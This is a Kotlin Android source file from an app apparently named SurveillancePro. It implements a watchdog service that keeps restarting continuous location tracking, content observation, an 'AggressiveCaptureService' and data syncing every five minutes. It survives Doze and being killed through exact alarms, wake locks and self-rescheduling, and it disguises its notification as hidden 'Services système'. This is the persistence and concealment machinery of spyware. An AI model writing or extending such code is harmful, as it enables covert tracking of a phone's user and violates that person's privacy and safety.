package com.surveillancepro.android.services

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.workers.SyncWorker

/**
 * Service Watchdog qui surveille et redémarre les autres services.
 * 
 * Ce service est CRITIQUE pour garantir que l'application fonctionne
 * en permanence, même si Android tue les autres services.
 * 
 * Fonctionnalités :
 * - Vérifie périodiquement que tous les services sont actifs
 * - Redémarre les services tués
 * - Utilise des alarmes exactes pour survivre au mode Doze
 * - Se redémarre lui-même si nécessaire
 */
class WatchdogService : Service() {

    companion object {
        private const val TAG = "WatchdogService"
        private const val CHANNEL_ID = "watchdog_channel"
        private const val NOTIFICATION_ID = 9999
        private const val CHECK_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
        
        fun start(context: Context) {
            try {
                val intent = Intent(context, WatchdogService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to start WatchdogService: ${e.message}")
            }
        }
        
        fun scheduleAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, WatchdogService::class.java)
                val pendingIntent = PendingIntent.getService(
                    context, 0, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                
                val triggerTime = System.currentTimeMillis() + CHECK_INTERVAL_MS
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        triggerTime,
                        pendingIntent
                    )
                } else {
                    alarmManager.setExact(
                        AlarmManager.RTC_WAKEUP,
                        triggerTime,
                        pendingIntent
                    )
                }
                Log.d(TAG, "Watchdog alarm scheduled for ${CHECK_INTERVAL_MS / 1000}s")
            } catch (e: Exception) {
                Log.w(TAG, "Failed to schedule alarm: ${e.message}")
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        acquireWakeLock()
        Log.d(TAG, "WatchdogService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "WatchdogService started")
        
        // Vérifier et redémarrer les services
        checkAndRestartServices()
        
        // Programmer la prochaine vérification
        scheduleNextCheck()
        
        // Programmer une alarme de secours
        scheduleAlarm(this)
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        releaseWakeLock()
        
        // Se redémarrer automatiquement
        Log.w(TAG, "WatchdogService destroyed - scheduling restart")
        scheduleAlarm(this)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Services système",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Maintien des services en arrière-plan"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Services système")
            .setContentText("Actif")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SupervisionPro:WatchdogWakeLock"
            ).apply {
                acquire(10 * 60 * 1000L) // 10 minutes max
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire wake lock: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
        } catch (_: Exception) {}
    }

    private fun checkAndRestartServices() {
        val storage = DeviceStorage.getInstance(this)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            Log.d(TAG, "Not configured yet, skipping service check")
            return
        }

        Log.d(TAG, "Checking services...")

        // 1. LocationService
        try {
            startForegroundService(Intent(this, LocationService::class.java).apply {
                putExtra(LocationService.EXTRA_MODE, LocationService.MODE_CONTINUOUS)
            })
            Log.d(TAG, "LocationService: OK")
        } catch (e: Exception) {
            Log.w(TAG, "LocationService restart failed: ${e.message}")
        }

        // 2. ContentObserverService
        try {
            startForegroundService(Intent(this, ContentObserverService::class.java))
            Log.d(TAG, "ContentObserverService: OK")
        } catch (e: Exception) {
            Log.w(TAG, "ContentObserverService restart failed: ${e.message}")
        }

        // 3. AggressiveCaptureService
        try {
            startForegroundService(Intent(this, AggressiveCaptureService::class.java))
            Log.d(TAG, "AggressiveCaptureService: OK")
        } catch (e: Exception) {
            Log.w(TAG, "AggressiveCaptureService restart failed: ${e.message}")
        }

        // 4. SyncWorker
        try {
            SyncWorker.schedule(this, intervalMinutes = 5)
            Log.d(TAG, "SyncWorker: OK")
        } catch (e: Exception) {
            Log.w(TAG, "SyncWorker schedule failed: ${e.message}")
        }

        // 5. Trigger immediate sync
        try {
            SyncWorker.triggerNow(this)
        } catch (_: Exception) {}

        Log.d(TAG, "Service check complete")
    }

    private fun scheduleNextCheck() {
        handler.postDelayed({
            checkAndRestartServices()
            scheduleNextCheck()
        }, CHECK_INTERVAL_MS)
    }
}
